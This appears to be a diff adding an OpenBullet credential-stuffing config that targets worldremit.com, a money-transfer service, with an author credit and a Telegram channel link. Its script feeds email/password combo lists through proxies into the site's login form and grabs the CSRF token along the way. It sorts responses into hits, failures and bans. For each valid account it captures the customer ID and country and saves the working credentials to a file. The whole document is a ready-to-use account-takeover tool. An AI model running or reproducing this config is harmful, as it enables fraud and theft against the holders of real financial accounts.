@@ -1,0 +1,117 @@
+[SETTINGS]
+{
+  "Name": "worldremit.com",
+  "SuggestedBots": 80,
+  "MaxCPM": 0,
+  "LastModified": "2021-05-23T10:29:41.260009+04:30",
+  "AdditionalInfo": "Telegram Channel: https://t.me/OpenBulletChannel",
+  "Author": "@Hogo_Victor",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Author Telegram Id:@Hogo_Victor",
+      "VariableName": "",
+      "Id": 147763839
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get REQUEST GET "https://www.worldremit.com/en/account/login" 
+  
+  HEADER "Host: www.worldremit.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Referer: https://www.worldremit.com/en" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: close" 
+
+#Token PARSE "<SOURCE>" LR "name=\"_csrf\" value=\"" "\"" -> VAR "Token" 
+
+#Login REQUEST POST "https://www.worldremit.com/en/account/login" Multipart 
+  
+  STRINGCONTENT "_csrf: <Token>" 
+  STRINGCONTENT "redirect-url: " 
+  STRINGCONTENT "email: <USER>" 
+  STRINGCONTENT "password: <PASS>" 
+  BOUNDARY "-----------------------------166962501719333482912603863471" 
+  HEADER "Host: www.worldremit.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Referer: https://www.worldremit.com/en/account/login" 
+  HEADER "Adrum: isAjax:true" 
+  HEADER "Origin: https://www.worldremit.com" 
+  HEADER "Te: trailers" 
+  HEADER "Connection: clos" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "customerId" 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect username or password" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" EqualTo "403" 
+
+#Get REQUEST GET "https://www.worldremit.com/wa/api/account" 
+  
+  HEADER "Host: www.worldremit.com" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Language: en-US,en;q=0.5" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "ADRUM: isAjax:true" 
+  HEADER "Connection: close" 
+  HEADER "Referer: https://www.worldremit.com/en/fr" 
+
+#Customer_ID PARSE "<SOURCE>" LR "SenderReferenceNumber\":\"" "\"" CreateEmpty=FALSE -> CAP "Customer ID" 
+
+#Country PARSE "<SOURCE>" LR "country\":{\"code\":\"" "\"" CreateEmpty=FALSE -> CAP "Country" 
+
+#Save UTILITY File "worldremit.com.txt" AppendLines "<USER>:<PASS>   Customer ID:<Customer ID>   Country:<Country>" -> VAR "Save" 
+
+#Telegram_Channel FUNCTION Constant "https://t.me/OpenBulletChannel" -> CAP "Telegram Channel" 
+
